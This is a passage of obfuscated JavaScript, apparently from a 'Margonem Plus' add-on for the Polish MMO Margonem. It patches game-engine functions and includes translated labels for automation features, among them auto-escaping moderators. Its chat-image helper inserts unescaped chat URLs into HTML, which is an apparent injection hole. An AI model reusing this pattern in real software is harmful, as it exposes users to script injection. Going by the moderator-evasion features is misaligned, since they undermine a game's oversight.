    const _0x5ee4da = document.createElement("div");
    _0x5ee4da.className = "mp-alert";
    const _0xffac2c = document.createElement("div");
    _0xffac2c.className = "mp-alert-message";
    _0xffac2c.innerHTML = _0x271058;
    _0x5ee4da.appendChild(_0xffac2c);
    const _0xb48074 = document.createElement("div");
    _0xb48074.className = "mp-alert-progress";
    _0xb48074.style.animationDuration = _0x48eb18 + "ms";
    _0x5ee4da.appendChild(_0xb48074);
    _0x5ee4da.addEventListener("click", function () {
      _0x5ee4da?.classList?.add("fade-out");
      setTimeout(() => _0x5ee4da.remove(), 500);
    });
    _0x1c3785.appendChild(_0x5ee4da);
    setTimeout(() => {
      _0x5ee4da?.classList?.add("fade-out");
      setTimeout(() => _0x5ee4da.remove(), 500);
    }, _0x48eb18);
  }
  const _0x1555d9 = {
    addAlert: _0x815640
  };
  return _0x1555d9;
}();
export function addStyle(_0x480a51, _0x5da8f0 = false, _0x17397f = false) {
  if (_0x5da8f0 && !_0x17397f) {
    const _0x241f1a = document.createElement("style");
    _0x241f1a.className = _0x480a51;
    _0x241f1a.textContent = _0x5da8f0;
    document.head.appendChild(_0x241f1a);
  }
  if (!_0x5da8f0 && _0x17397f) {
    const _0x41acd2 = document.createElement("link");
    _0x41acd2.className = _0x480a51;
    _0x41acd2.rel = "stylesheet";
    _0x41acd2.href = _0x17397f;
    document.head.appendChild(_0x41acd2);
  }
}
export function removeStyle(_0x10b8e1) {
  $("." + _0x10b8e1)?.remove();
}
export function parseSecToTime(_0x19d905) {
  const _0x3841a3 = Math.floor(_0x19d905 / 60);
  const _0x34037d = Math.floor(_0x19d905 % 60);
  const _0x5ce3b5 = _0x3841a3 < 10 ? "0" + _0x3841a3 : _0x3841a3;
  const _0x50e009 = _0x34037d < 10 ? "0" + _0x34037d : _0x34037d;
  return _0x5ce3b5 + ":" + _0x50e009;
}
export const replaceImageLinksWithImgTag = _0x3060ae => {
  const _0x140d03 = /(https?:\/\/[^\s]+?\.(?:png|jpe?g|gif|webp|svg))/gi;
  if (!_0x140d03.test(_0x3060ae)) {
    return false;
  }
  _0x140d03.lastIndex = 0;
  return _0x3060ae.replace(_0x140d03, _0x1a934a => {
    return "<img class=\"do-action-cursor mp-chat-image\" src=\"" + _0x1a934a + "\" onclick=\"window.open('" + _0x1a934a + "', '_blank')\">";
  });
};
export function createUserTip(_0x18abd1, _0x590c7e = "", _0x4355fe, _0x59421a) {
  const _0x5bbd98 = {
    "1": "Administrator",
    "2": "Mistrz Gry",
    "4": "Super Moderator Chatu",
    "16": "Super Mistrz Gry",
    "32": "Moderator Chatu",
    "99": "Admin Margonem Plus"
  };
  const _0x258ceb = _0x4355fe[_0x18abd1.account] ? 99 : _0x18abd1.rank;
  const _0xd2f46d = _0x5bbd98[_0x18abd1.rank] ? "<div class=\"mp-tip-rank\">" + _0x5bbd98[_0x258ceb] + "</div>" : "";
  const _0x368b91 = _0x18abd1.clan ? "<div class=\"mp-clan-in-tip\">" + _0x18abd1.clan + "</div><div class=\"mp-tip-line\"></div>" : "";
  const _0x52a279 = _0x59421a[_0x18abd1.account] ? "<div class=\"mp-tip-line\"></div><div id=\"mp-neons\" class=\"mp-neons\">" + _0x59421a[_0x18abd1.account] + "</div>" : "";
  const _0x16e694 = _0x590c7e ? "<div class=\"mp-tip-line\"></div><div>" + _0x590c7e + "</div>" : "";
  const _0x4bef8d = _0x18abd1.lvlop ? "<div class=\"mp-tip-line\"></div><div>Poziom operacyjny: " + _0x18abd1.lvlop + "</div>" : "";
  const _0x100817 = _0x18abd1.icon ? _0x18abd1.icon : _0x18abd1.d.icon;
  return "\n            <div class=\"mp-tip-content\">\n                " + _0xd2f46d + "\n                <div class=\"info-wrapper\">\n                    <div class=\"nick\">" + _0x18abd1.nick + " (" + _0x18abd1.lvl + _0x18abd1.prof + ")</div>\n                </div>\n                " + _0x368b91 + "\n                <div class=\"mp-outfit-animate\" style=\"background: url('https://micc.garmory-cdn.cloud/obrazki/postacie/" + _0x100817 + "')\"></div>\n                " + _0x52a279 + "\n                " + _0x16e694 + "\n                " + _0x4bef8d + "\n            </div>\n        ";
}
export async function initAdmin(_0x430a17, _0x46deb8) {
  function _0x347883() {
    const _0x3a0977 = Engine.whoIsHere.getList();
    for (const _0x277bac in _0x3a0977) {
      const _0x38b8be = _0x3a0977[_0x277bac].$[0].firstElementChild;
      const _0x521004 = $(_0x38b8be).attr("tip-id");
      const _0x294fba = _0x1a333f(_0x277bac);
      if (!_0x294fba) {
        continue;
      }
      const _0x294927 = window.TIPS.allTips[_0x521004]?.[0]?.innerHTML;
      const _0x5f5325 = _0x294fba.account;
      if (_0x294927 !== undefined && _0x46deb8[_0x5f5325]) {
        const _0x529e5d = document.createElement("div");
        _0x529e5d.innerHTML = _0x294927;
        if (!_0x529e5d.querySelector("#mp-neons")) {
          const _0x169b83 = document.createElement("div");
          _0x169b83.className = "mp-tip-line";
          if (_0x46deb8[_0x5f5325].length < 1) {
            _0x169b83.style.display = "none";
          }
          const _0x32d139 = document.createElement("div");
          _0x32d139.id = "mp-neons";
          _0x32d139.className = "mp-neons";
          _0x32d139.innerHTML = _0x46deb8[_0x5f5325];
          _0x529e5d.appendChild(_0x169b83);
          _0x529e5d.appendChild(_0x32d139);
          window.TIPS.allTips[_0x521004] = _0x529e5d.innerHTML;
        }
      }
    }
  }
  let _0x39183d;
  $("#mp-root").on("mouseenter", ".tip-container[data-tip-type=\"t_other\"]", () => {
    _0x347883();
    clearInterval(_0x39183d);
    _0x39183d = setInterval(_0x347883, 100);
  });
  $("#mp-root").on("mouseleave", ".tip-container[data-tip-type=\"t_other\"]", () => {
    clearInterval(_0x39183d);
  });
  function _0x23ebff(_0x59c1fa, _0x4f3f3e, _0x6e0f99) {
    const _0x274632 = document.createElement("div");
    _0x274632.innerHTML = _0x59c1fa;
    if (!_0x274632.querySelector("#mp-neons")) {
      const _0x332531 = document.createElement("div");
      _0x332531.className = "mp-tip-line";
      if (_0x46deb8[_0x6e0f99].length < 1) {
        _0x332531.style.display = "none";
      }
      const _0x3d8709 = document.createElement("div");
      _0x3d8709.id = "mp-neons";
      _0x3d8709.className = "mp-neons";
      _0x3d8709.innerHTML = _0x4f3f3e;
      _0x274632.appendChild(_0x332531);
      _0x274632.appendChild(_0x3d8709);
    }
    return _0x274632.innerHTML;
  }
  function _0x1a333f(_0x1c9bd3) {
    if (Engine.hero.d.id === _0x1c9bd3) {
      return Engine.hero.d;
    }
    const _0x55496d = Engine.others.check();
    return _0x55496d[_0x1c9bd3]?.d || null;
  }
  const _0x300317 = Engine.miniMapController.handHeldMiniMapController.getMiniMapTipController().manageShowHideTip;
  Engine.miniMapController.handHeldMiniMapController.getMiniMapTipController().manageShowHideTip = function (_0x25882d, _0x303972) {
    if (_0x303972) {
      const _0x10082e = Engine.miniMapController.handHeldMiniMapController.getObjectController(_0x303972.object[0]);
      const _0x1f1267 = _0x10082e.getObject(_0x303972.object[1]);
      const _0x4a422b = _0x1f1267.getTip()?.[0]?.[0];
      const _0x97139f = _0x1a333f(_0x303972.object[1]);
      if (_0x97139f && _0x4a422b && _0x46deb8[_0x97139f.account]) {
        const _0xff8e1c = document.createElement("div");
        _0xff8e1c.innerHTML = _0x4a422b.outerHTML;
        if (!_0xff8e1c.querySelector("#mp-neons")) {
          const _0x61612c = document.createElement("div");
          _0x61612c.className = "mp-tip-line";
          if (_0x46deb8[_0x97139f.account].length < 1) {
            _0x61612c.style.display = "none";
          }
          const _0x2ca9f8 = document.createElement("div");
          _0x2ca9f8.id = "mp-neons";
          _0x2ca9f8.className = "mp-neons";
          _0x2ca9f8.innerHTML = _0x46deb8[_0x97139f.account];
          _0xff8e1c.appendChild(_0x61612c);
          _0xff8e1c.appendChild(_0x2ca9f8);
          const _0x39488b = $(_0xff8e1c.innerHTML);
          _0x1f1267.setTip(_0x39488b, "t_other");
        }
      }
    }
    _0x300317.apply(this, arguments);
  };
  const _0x5de2c9 = Engine.canvasTip.show;
  Engine.canvasTip.show = function (_0x1017fa, _0x17411a) {
    const _0x24b822 = _0x17411a?.d?.account;
    if (_0x24b822 && _0x46deb8[_0x24b822] && _0x17411a.tip?.[0]) {
      _0x17411a.tip[0] = _0x23ebff(_0x17411a.tip[0], _0x46deb8[_0x24b822], _0x24b822);
    }
    _0x5de2c9.apply(this, arguments);
  };
  const _0x40c369 = _0x10a6f7 => {
    if (_0x10a6f7.includes("ITEM#BUKA")) {
      const _0x531887 = /ITEM#BUKA/gi;
      return _0x10a6f7.replace(_0x531887, "<span class=\"linked-chat-item linked-chat-item-tip-created\" data-item-type=\"t-leg\" data-tip-type=\"t_item\" data-fake-tip>[Buka]</span>");
    } else if (_0x10a6f7.includes("ITEM#PRIMA_APRILIS")) {
      const _0x372cb2 = /ITEM#PRIMA_APRILIS/gi;
      return _0x10a6f7.replace(_0x372cb2, "<span class=\"linked-chat-item linked-chat-item-tip-created\" data-item-type=\"t-leg\" data-tip-type=\"t_item\" data-fake-tip>[Szpącicielski Puchar]</span>");
    } else if (_0x10a6f7.includes("ITEM#WIELKANOC")) {
      const _0x59ca1d = /ITEM#WIELKANOC/gi;
      return _0x10a6f7.replace(_0x59ca1d, "<span class=\"linked-chat-item linked-chat-item-tip-created\" data-item-type=\"t-leg\" data-tip-type=\"t_item\" data-fake-tip>[Szpącicielska Pisanka]</span>");
    } else if (_0x10a6f7.includes("ITEM#KOPALNIA300")) {
      const _0x4152dd = /ITEM#KOPALNIA300/gi;
      return _0x10a6f7.replace(_0x4152dd, "<span class=\"linked-chat-item linked-chat-item-tip-created\" data-item-type=\"t-leg\" data-tip-type=\"t_item\" data-fake-tip>[Runa czarodzieja]</span>");
    } else {
      return false;
    }
  };
  const _0x3723c2 = {};
  const _0x5f23fb = Engine.chatController.addMessage;
  Engine.chatController.addMessage = function (_0x1e4b3b) {
    const _0x48f1c7 = _0x1e4b3b.authorBusinessCard;
    if (_0x48f1c7) {
      const _0x276a60 = _0x48f1c7.getNick();
      const _0x1006cd = _0x48f1c7.getId();
      if (_0x276a60 && _0x1006cd) {
        _0x3723c2[_0x276a60] = _0x1006cd;
      }
    }
    _0x5f23fb(_0x1e4b3b);
  };
  const _0x5bc749 = Engine.chatController.getChatMessageWrapper().appendMessageToMessageWrapper;
  Engine.chatController.getChatMessageWrapper().appendMessageToMessageWrapper = function (_0x24280e, _0x18a132, _0xfdd4eb, _0x3a351f) {
    const _0x5de007 = _0x3723c2[_0x18a132];
    if (_0x5de007) {
      const _0x27929f = Engine.businessCardManager.getCard(_0x5de007);
      const _0x2c1feb = {
        nick: _0x27929f.getNick(),
        lvl: _0x27929f.getLvl(),
        prof: _0x27929f.getProf(),
        icon: _0x27929f.getIcon(),
        account: _0x27929f.getAcc(),
        oplvl: _0x27929f.getOperationLevel()
      };
      const _0xf08b5c = $(_0xfdd4eb[0]);
      const _0xada76c = _0xf08b5c.find(".author-section").first();
      _0xada76c.tip(createUserTip(_0x2c1feb, false, _0x430a17, _0x46deb8));
      const _0x3bf832 = _0xf08b5c.find(".message-section").first();
      const _0x40e4e7 = _0x3bf832.text();
      const _0x46bf25 = _0x40c369(_0x40e4e7);
      const _0x5d97d0 = replaceImageLinksWithImgTag(_0x40e4e7);
      if (_0x46bf25) {
        _0x3bf832.html(_0x46bf25);
      }
      if (_0x5d97d0) {
        _0x3bf832.html(_0x5d97d0);
      }
    }
    _0x5bc749.apply(this, arguments);
  };
}
export function getCacheTimestamp() {
  return parseInt(localStorage.getItem("margonem_plus_cache"), 10) || 0;
}
export function getFullHourTimestamp() {
  return Math.floor(new Date().setMinutes(0, 0, 0) / 1000);
}
export function updateCacheTimestamp(_0x3bf59f) {
  localStorage.setItem("margonem_plus_cache", _0x3bf59f);
}
export const getJoinTime = _0x5f44b9 => {
  let _0x33b9ba = new Date(_0x5f44b9);
  let _0x46595b = _0x33b9ba.getHours();
  let _0x194baf = _0x33b9ba.getSeconds();
  let _0x45e6e6 = _0x33b9ba.getMinutes();
  if (_0x46595b < 10) {
    _0x46595b = "0" + _0x46595b;
  }
  if (_0x45e6e6 < 10) {
    _0x45e6e6 = "0" + _0x45e6e6;
  }
  if (_0x194baf < 10) {
    _0x194baf = "0" + _0x194baf;
  }
  return _0x46595b + ":" + _0x45e6e6 + ":" + _0x194baf;
};
export function sanitizeText(_0x82020a) {
  if (typeof _0x82020a !== "string") {
    return "";
  }
  return _0x82020a.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}
export async function showAlert(_0x293058, _0x106ae) {
  return new Promise(_0x422edf => {
    const _0x1a0603 = $("#mp-overlay-alert");
    if (_0x1a0603.length > 0) {
      _0x1a0603.remove();
    }
    const _0x218004 = sanitizeText(_0x293058);
    const _0xcbf643 = sanitizeText(_0x106ae);
    const _0x2d947f = $("\n        <div id=\"mp-overlay-alert\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Ogłoszenie</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-alert-text text-red\">" + _0x218004 + "</div>\n                <div style=\"text-align: center;\">Wysłane przez: <b>" + _0xcbf643 + "</b></div>\n            </div>\n        </div>\n    ");
    function _0x5d7876() {
      _0x2d947f.remove();
    }
    _0x2d947f.find("#closeBtn").click(() => {
      _0x5d7876();
      _0x422edf(null);
    });
    _0x2d947f.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x1ba0c2, _0x502c51) => {}
    });
    const _0x3e1cce = _0x2d947f.outerWidth();
    const _0x139255 = _0x2d947f.outerHeight();
    const _0x3d978b = (window.innerWidth - _0x3e1cce) / 2;
    const _0x5005f0 = (window.innerHeight - _0x139255) / 2;
    const _0x3d2c63 = {
      zIndex: 999,
      position: "absolute",
      left: _0x3d978b + "px",
      top: _0x5005f0 + "px"
    };
    _0x2d947f.css(_0x3d2c63);
  });
}
export function l() {
  return "cipka";
}
export function getTranslation() {
  const _0x476f03 = {
    tabs: {
      info: "Informacje",
      addons: "Dodatki",
      alerts: "Powiadomienia",
      settings: "Ustawienia",
      users: "Użytkownicy"
    },
    widget: {
      show: "Pokaż skróty",
      hide: "Ukryj skróty",
      add: "Dodaj skrót",
      del: "Usuń skrót",
      tip: "Włączenie dodaje pływające okno z szybkimi odnośnikami do ustawień zainstalowanych dodatków"
    },
    getAddonsToSee: "Wybierz dodatek, aby zobaczyć jego opis.",
    optOff: "Odinstaluj",
    optOn: "Zainstaluj",
    otherSettings: {}
  };
  _0x476f03.otherSettings.wrapLoot = "Nie zawijaj okna lootu";
  _0x476f03.otherSettings.rendering = "Włącz lepszy rendering mapy";
  _0x476f03.otherSettings.scrollChat = "Utrzymuj czat na dole przy wiadomości";
  _0x476f03.otherSettings.changeMaps = "Podmieniaj grafiki map (f5)";
  const _0x147fe1 = {
    title: {
      style: "Wygląd",
      hp: "Pasek życia",
      exp: "Pasek doświadczenia",
      ping: "Wskaźnik pingu",
      builds: "Przyciski zestawów",
      stats: "Statystyki postaci",
      fullPercent: "Pokazuj dokładny procent"
    },
    showPing: "Pokazuj ping",
    showStats: "Podmieniaj statystyki",
    showButtons: "Pokazuj przyciski",
    showPercent: "Pokaż procent",
    showPoints: "Pokaż wartość",
    showReach: "Pokaż potrzebną ilość do max",
    showReachPercent: "Pokaż brakujący procent",
    showPointsAndMax: "Pokaż wartość + max",
    ping: {},
    builds: {},
    fullPercent: {},
    bonus: {}
  };
  _0x147fe1.ping.number = "Pokazuj wartość numeryczna";
  _0x147fe1.ping.ball = "Ping w formie kulki";
  _0x147fe1.builds.firstLetter = "Pokaż pierwszą litere nazwy";
  _0x147fe1.builds.number = "Pokaż numer zestawu";
  _0x147fe1.fullPercent.hp = "Pasek życia";
  _0x147fe1.fullPercent.exp = "Pasek doświadczenia";
  _0x147fe1.bonus.dmg = "Atak";
  _0x147fe1.bonus.ck = "Cios krytyczny";
  _0x147fe1.bonus.ac = "Pancerz";
  _0x147fe1.bonus.heal = "Leczenie";
  _0x147fe1.bonus.sa = "Szybkość ataku";
  _0x147fe1.bonus.lowevade = "Obniż. unik";
  _0x147fe1.bonus.lowsa = "Obniż. SA";
  _0x147fe1.bonus.lowcrit = "Obniż. kryt";
  _0x147fe1.bonus.resist = "Odporności";
  _0x147fe1.bonus.ena = "Energia";
  _0x147fe1.bonus.mana = "Mana";
  _0x147fe1.bonus.evade = "Unik";
  _0x147fe1.bonus.blok = "Blok";
  _0x147fe1.bonus.skf = "Moc ck fiz.";
  _0x147fe1.bonus.skm = "Moc ck mag.";
  _0x147fe1.bonus.hp = "Życie";
  _0x147fe1.bonus.destac = "Niszcz. panc";
  _0x147fe1.bonus.lowres = "Niszcz. odp";
  _0x147fe1.bonus.ku = "Udręka";
  _0x147fe1.bonus.da = "Dotyk";
  _0x147fe1.bonus.or = "Ratunek";
  _0x147fe1.bonus.destresource = "Niszcz. zasobów";
  const _0x77db27 = {
    title: "Ustawienia",
    build: "Szybka zmiana zestawu",
    options: {}
  };
  _0x77db27.options.titan = "Po wykryciu tytana";
  _0x77db27.options.colossus = "Po wykryciu Kolosa";
  _0x77db27.options.elite3 = "Po wykryciu Elita III";
  _0x77db27.options.useWhenNotEnemy = "Zmień, gdy nie ma wrogów w okolicy";
  _0x77db27.options.return = "Przywróć poprzedni zestaw, gdy npc zniknie";
  const _0x309bf6 = {
    addverify: {
      start: "Rozpoczęcie weryfikacji (lokalny)",
      stop: "Zakończenie weryfikacji (lokalny)",
      task: "Wysyłane polecenie dla Gracza (reminder)",
      positive: "Zakończenie pozytywne (prywatna)",
      negative: "Zakończenie negatywne (prywatna)"
    },
    addmenu: _0x476f03,
    add1: {
      common: "Zwykłe",
      unique: "Unikaty",
      heroic: "Heroiczne",
      improvements: "Ulepszacze",
      artisanbon: "Bonus x%",
      bind: "Związane",
      forceUnique: "Wymuś unikaty",
      progress: "Postęp w konsoli + overlay",
      "1": "Jednoręczne",
      "2": "Dwuręczne",
      "3": "Półtoraręczne",
      "4": "Dystansowe",
      "5": "Pomocnicze",
      "6": "Różdżki",
      "7": "Orby",
      "8": "Zbroje",
      "9": "Hełmy",
      "10": "Buty",
      "11": "Rękawice",
      "12": "Pierścienie",
      "13": "Naszyjniki",
      "14": "Tarcze",
      "29": "Strzały",
      weapon: "Bronie",
      armor: "Pancerze",
      jewelry: "Biżuterie",
      afterBattle: "Ulepsz, gdy po walce składników ≥ ",
      alwaysAfterBattle: "Zawsze po walce",
      bag: "Ulepsz, gdy po walce miejsca w torbie ≤ "
    },
    add4: {
      settings: {
        showButton: "Przycisk przelogowywania",
        autoLogin: "Przeloguj po ubiciu e2",
        autoLoginTip: "Przelogowywuje na pierwsza e2 z minutnika, po ubiciu jakiejś e2."
      }
    },
    add6: {
      rarity: {
        common: "t-norm",
        unique: "t-uniupg",
        heroic: "t-her",
        upgraded: "t-upgraded",
        legendary: "t-leg"
      }
    },
    add7: {
      options: {
        exp: "Nagroda z doświadczeniem",
        noExp: "Nagroda bez doświadczenia"
      }
    },
    add8: {
      averagelvl: "Średni poziom ulepszenia:",
      averagelvltip: "Sredni poziom ulepszenia ekwipunku",
      legbon: "Bonusy legendarne",
      odps: "Odporności",
      odpPoison: "Odporność na trucizne",
      odpFire: "Odporność na ogień",
      odpFrost: "Odporność na zimno",
      odpLight: "Odporność na błyskawice",
      ck: "Cios krytyczny",
      ckpercent: "Szansa na cios krytyczny z ekwipunku",
      skm: "Moc ciosu krytycznego magicznego",
      skf: "Moc ciosu krytycznego fizycznego",
      lt: "Leczenie turowe",
      low: "Obniżanie",
      lowevade: "Obniżanie uniku",
      lowck: "Obniżanie ciosu krytycznego",
      slow: "Obniżanie szybkości ataku"
    },
    add13: {
      pvp: "Walka z graczem",
      e2: "Walka z elita II",
      e3: "Walka z elita III",
      heroes: "Walka z herosem",
      titan: "Walka z tytanem",
      colossus: "Walka z kolosem",
      show: "Wyświetlaj podsumowanie po walce"
    },
    add14: {
      closeLoot: {
        solo: "W pojedynkę",
        party: "W grupie"
      },
      rarity: {
        common: "Zwykły",
        unique: "Unikatowy",
        heroic: "Heroiczny",
        upgraded: "Ulepszony",
        legendary: "Legendarny",
        onlylegendary: "Tylko Legendarne",
        highest: "Najlepsza (grp)"
      },
      other: {
        chest: "Skrzynie",
        claw: "Pazury, serca etc",
        neutral: "Neutralne",
        stone: "Kamienie",
        potions: "Miskturki",
        runes: "Smocze runy"
      },
      cl: {
        "17": "Złoto",
        "22": "Talizmany",
        "24": "Torby",
        "26": "Ulepszacze",
        "32": "Teleporty",
        cosmetic: "Kosmetyczne",
        other: "Pozostałe"
      }
    },
    add16: {
      gold: "Sprawdź dostępność Złota",
      zcs: "Sprawdź dostępność Zwoi smoka",
      drop: "Sprawdź dostępność Błoga na drop",
      tp: "Sprawdź dostępność Teleportów",
      gildia: "Sprawdź dostępność Kluczy do kletki"
    },
    add17: {
      show: {
        alch: "Alchemia",
        ore: "Złoże",
        najemnik: "Tropiciel herosów",
        grzyb: "Grzybobranie",
        event: "Elita eventowa",
        elite3: "Elita III",
        heroes: "Heros",
        titan: "Tytan",
        colossus: "Kolos"
      },
      buttons: {
        claim: "Zajmij",
        global: "Global",
        clan: "Klan",
        chase: "Podejdź",
        close: "Zamknij",
        discord: "Discord"
      },
      options: {
        hideonkill: "Po zniknięciu npc",
        hideonchangemap: "Po zmianie mapy"
      },
      discord: {
        everyone: "@everyone",
        here: "@here",
        roles: "Własne role"
      }
    },
    add18: {
      shadow: {
        map: "Cień mapy",
        loot: "Cień lootu",
        wrapper: "Cień wrappera",
        window: "Cień okna lootu",
        buttons: "Cień przycisków"
      },
      title: {
        color1: "Kolor pierwszy",
        color2: "Kolor drugi",
        rainItems: "Deszcz przedmiotów",
        alert: "Alert",
        audio: "Odegraj dźwięk",
        clan: "Powiadom klan",
        tipAddText: "Dodaj wiadomość",
        tipAddAudio: "Dodaj dźwięk",
        tipAddImage: "Dodaj grafikę",
        stone: "Aktywuj przy kamieniu",
        stoneLight: "Podświetlenie kamienia",
        tipRand: "Możliwość włączenia lub wyłączenia trybu",
        shadowGame: "Przyciemnienie gry"
      },
      animations: {
        wrapper: "Animacje wrappera",
        item: "Animacje przedmiotu",
        window: "Animacje okna lootu",
        scaling: "Powiększanie",
        bounce: "Podskakiwanie",
        shake: "Trzęsienie",
        flip: "Zmiana stron",
        spin: "Wirowanie",
        pulse: "Pulsowanie"
      },
      mode: {
        loot: "Grafiki z lootu",
        star: "Gwiazdki",
        heart: "Serca",
        firework: "Fajerwerki",
        confetti: "Konfetti",
        images: "Własna grafika"
      },
      other: {
        main: "Własne ustawienia",
        randomMode: "Tryb losowego koloru",
        rainbowMode: "Tryb ciągłego losowego koloru"
      }
    },
    add19: {
      auto: {
        accept: "Akceptuj zaproszenie",
        przywo: "Akceptuj przywołanie",
        disband: "Rozwiązuj grupę po e2",
        giveLeader: "Przekaż dowództwo"
      },
      hotkeys: {
        inviteMap: "Zaproś graczy na mapie",
        debug: "Odbuguj zaproszenie",
        disband: "Rozwiąż/opuść grupę",
        partyInfo: "Wyślij info. o grupie",
        kickAfk: "Wyrzuć graczy AFK",
        systemCreate: "Stwórz za pomocą ST",
        kickRandom: "Wyrzuć losową osobę"
      },
      stats: {
        showProf: "Pokaż ilość profesji",
        showDrop: "Pokaż zaniżanie dropu",
        showMinMax: "Pokaż poziom min i max"
      }
    },
    add20: {
      title: {
        labelColor: "Tabliczki na przedmiocie",
        settings: "Dodatkowe oznaczenia",
        images: "Zmiana grafik przedmiotów",
        tags: "Metki z nazwami"
      },
      labelSettings: {
        dmg: "Oznacz obrażenia broni",
        mix: "Wyróżnij mikstury leczące",
        summon: "Podmień grafiki przywołań",
        stone: "Podmień grafiki kamieni"
      },
      labelColor: {
        upgrade: "Ulepszenie przedmiotu",
        legbon: "Bonus legendarny",
        bless: "Rodzaj błoga",
        level: "Poziom przedmiotu",
        tier: "Tier komponentu"
      }
    },
    add21: {
      settings: {
        expires: "Zawsze pytaj o potwierdzenie zniszczenia wygasłych przedmiotów, jeśli takie posiadasz",
        connect: "Kliknij przedmiot z wciśniętym klawiszem <span class=\"mp-badge\">CTRL</span>, aby połączyć go z innym",
        trash: "Kliknij przedmiot z wciśniętym klawiszem <span class=\"mp-badge\">ALT</span>, aby oznaczyć go do usunięcia",
        split: "Kliknij przedmiot z wciśniętym klawiszem <span class=\"mp-badge\">SHIFT</span>, aby zacząć go dzielić"
      },
      title: {
        expires: "Wygasłe przedmioty",
        connect: "Łączenie przedmiotów",
        trash: "Niszczenie przedmiotów",
        split: "Dzielenie przedmiotów"
      },
      warning: {
        legendary: "Niszczenie przedmiotów legednarnych zablokowane",
        upgrade: "Niszczenie przedmiotów ulepszonych zablokowane",
        personal: "Niszczenie przedmiotów personalizowanych zablokowane",
        licytacja: "Niszczenie przedmiotów z licytacji zablokowane",
        ulepszacz: "Niszczenie punktów ulepszeń zablokowane"
      },
      denyAsk: "Odrzucono zapytanie o czyszczenie",
      successClear: "Zakończono czyszczenie"
    },
    add26: {
      components: {
        common: "Zwykłe",
        unique: "Unikatowe",
        heroic: "Heroiczne",
        stack: "Tylko pełne staki",
        auto: "Auto. wystawianie"
      }
    },
    add28: {
      tip: {
        addDialog: "Dodaj tekst z dialogu"
      }
    },
    add31: {
      showQuantity: {
        stage1: "3 przedmiotów",
        stage2: "6 przedmiotów",
        stage3: "9 przedmiotów",
        stage4: "12 przedmiotów",
        stage5: "15 przedmiotów"
      }
    },
    add32: {
      minititle: {
        bonus: "Wzmocnienie",
        legbon: "Legendarny bonus",
        lore: "Opis przedmiotu",
        loot: "Podpis przedmiotu",
        socket: "Gniazdo"
      },
      add: {
        loot: "Zmiana podpisu",
        essence: "Esencja przedmiotu",
        unbind: "Koszt odwiązania"
      },
      header: {
        type: "Ukryj typ przedmiotu",
        builds: "Ukryj zestawy",
        upgrade: "Ukryj ulepszenie",
        upgradeNumber: "Zamień ikonę na cyfrę"
      },
      custom: {
        background: "Dodaj tło Margonem+",
        gap: "Odstęp między stat.",
        separator: "Dodaj separatory",
        damage: "Oznacz żwyioły ataku"
      },
      other: {
        refund: "Wyróżnij ekstrakcje",
        damage: "Wartości statystyk",
        teleport: "Miejsce teleportacji"
      },
      footer: {
        status: "Ukryj stan przedmiotu"
      },
      section: {
        bonus: "Ukryj wzmocnienie",
        legbon: "Ukryj leg. bonus",
        lore: "Ukryj opis",
        loot: "Ukryj podpis",
        socket: "Ukryj gniazdo"
      },
      color: {
        bonus: "Kolor wzmocnienia",
        legbon: "Kolor leg. bonus",
        lore: "Kolor opisu",
        loot: "Kolor podpisu",
        socket: "Kolor gniazda"
      }
    },
    add35: {
      show: {
        pickaxe: "Podświetlaj <b style=\"color: red;\">kilofy</b>",
        gate: "Podświetlaj <b style=\"color: orange;\">przejścia</b>",
        ore: "Podświetlaj <b style=\"color: #9b54ff;\">rudy</b>",
        jump: "Zapisuj moment wejścia"
      }
    },
    add36: {
      options: {
        acceptBattle: "Przyjmij walkę",
        startBattle: "Zatwierdź przygotowanie",
        nextBattle: "Następna walka",
        fastBattle: "Szybka walka",
        getRewards: "Odbierz nagrodę"
      }
    },
    add37: {
      title: {
        lvl: "Wbicie poziomu",
        pvp: "Walka z graczem",
        enemy: "Wróg na mapie",
        elite: "Wykrycie e2",
        chatter: "Kafelki szybkich wiadomości"
      },
      settings: {
        lvl: "Informuj klan",
        pvp: "Informuj klan",
        enemy: "Aktywne",
        elite: "Informuj klan",
        chatter: "Aktywne"
      },
      options: {
        send: "Wysyłaj wiadomość o wrogu na klan",
        message: "Wyświetl informacje w message",
        audio: "Odegraj dźwięk, gdy wykryje wroga",
        other: "Neutralni gracze są wrogami"
      }
    },
    add38: _0x147fe1,
    add40: {
      advantage: "Blokuj atak, gdy masz poziom większy o",
      advTip: "Uniemożliwia atakowanie przeciwnika, który ma poziom mniejszy o określoną wartość. Np: Gdy masz poziom 300 i ustawisz by nie atakowało gdy poziom przeciwnika jest mniejszy o 20 to nie zaatakujesz gracza, który ma 279 poziom. Każda postać powyżej 300 jest traktowana jako 300 poziom.",
      list: {
        always: "Zawsze atakuj",
        never: "NIgdy nie atakuj"
      },
      killMine: {
        mine: "Atakuj na Kopalni",
        trap: "Atakuj w Pułapce",
        nongrp: "Atakuj na mapach nongrp"
      }
    },
    add44: {
      title: {
        work: "Działanie",
        distance: "Uciekaj",
        relation: "Uciekaj przed",
        alwaysEscape: "Zawsze uciekaj",
        use: "Używaj teleportu"
      },
      work: {
        escape: "Aktywne",
        onlyred: "Tylko czerwone mapy"
      },
      distance: {
        instant: "Od razu po wykryciu",
        range: "Gdy jest bliżej niż <distance></distance> kratek"
      },
      relation: {
        "1": "Zwykli gracze",
        "2": "Przyjaciele",
        "3": "Wrogowie",
        "4": "Klanowicze",
        "5": "Sojusznicy",
        "6": "Wrogowie klanu",
        "7": "Przyjaźni (Perkun)",
        "8": "Wrogowie (Perkun)"
      },
      alwaysEscape: {
        sm: "Przed Super Moderatorem Chatu",
        mc: "Przed Moderatorem Chatu",
        level: "Gdy poziom gracza większy o <level></level>",
        afk: "Ignoruj, gdy gracz jest AFK"
      },
      use: {
        item: "Wybranego teleportu",
        random: "Losowego teleportu"
      }
    },
    add47: _0x77db27,
    add48: {
      options: {
        titan: "Z tytanem",
        colossus: "Z kolosem",
        e3: "Z e3 eventowa"
      }
    },
    add52: {
      opt: {
        audio: "Odegraj dzwięk sprawdzenia",
        message: "Wyświetl message",
